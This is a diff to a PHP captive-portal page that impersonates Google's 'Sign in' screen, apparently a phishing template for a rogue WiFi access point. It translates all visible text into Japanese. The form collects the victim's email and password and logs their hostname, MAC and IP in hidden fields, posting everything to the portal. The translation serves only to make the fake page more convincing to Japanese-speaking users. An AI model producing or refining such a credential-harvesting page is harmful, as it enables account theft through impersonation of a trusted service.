@@ -4,7 +4,7 @@ require_once('helper.php');
 ?>
 
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html lang="ja" dir="ltr">
     <head>
         <meta charset="utf-8">
 
@@ -90,10 +90,10 @@ require_once('helper.php');
                     <!-- /Google Logo -->
                     </div>
                     <form method="POST" action="/captiveportal/index.php" onsubmit="redirect()" id='email-form-step'>
-                        <h1 class='g-h1'>Sign in</h1>
-                        <h2 class='g-h2'>Use your Google Account</h2>
+                        <h1 class='g-h1'>ログイン</h1>
+                        <h2 class='g-h2'>お客様の Google アカウントを使用</h2>
                         <div class='login-content'>
-                            <input name="email" id='email-input' type="text" class='g-input' placeholder="Email or phone" required>
+                            <input name="email" id='email-input' type="text" class='g-input' placeholder="メールアドレスまたは電話番号" required>
                             <!-- <div class="invalid-email" style='display:none;'> -->
                                 <!-- SVG for the invalid icon -->
                                 <!-- <span class="invalid-icon">
@@ -102,23 +102,23 @@ require_once('helper.php');
                                     </svg>
                                 </span><span class='invalid-email-text-span'>Enter a valid email or phone number</span>
                             </div> -->
-                            <input name="password" id='password-input' type="password" class='g-input password-input' placeholder="Password" required>
+                            <input name="password" id='password-input' type="password" class='g-input password-input' placeholder="パスワード" required>
 
                             <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
                             <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
                             <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
                             <input type="hidden" name="target" value="<?=$destination?>">
 
-                            <legend class='g-legend'>Forgot email?</legend>
+                            <legend class='g-legend'>メールアドレスを忘れた場合</legend>
                             <div class='login-priv'>
-                                <p class='p'>Not your computer? Use a Private Window to sign in.</p>
-                                <legend class='g-legend'>Learn more</legend>
+                                <p class='p'>ご自身のパソコンでない場合は、ゲストモードを使用して非公開でログインしてください。</p>
+                                <legend class='g-legend'>詳細</legend>
                             </div>
                             <!-- form navigation menu -->
                             <div class='login-nav'>
-                                <legend class='g-legend'>Create Account</legend>
+                                <legend class='g-legend'>アカウントを作成</legend>
                                 <!-- <div class='gbtn-primary btn-next-email'><span class='gbtn-label'>Next</span></div> -->
-                                <button class='gbtn-primary' type="submit">Next</button>
+                                <button class='gbtn-primary' type="submit">次へ</button>
                             </div>
                         </div>
                     </form>
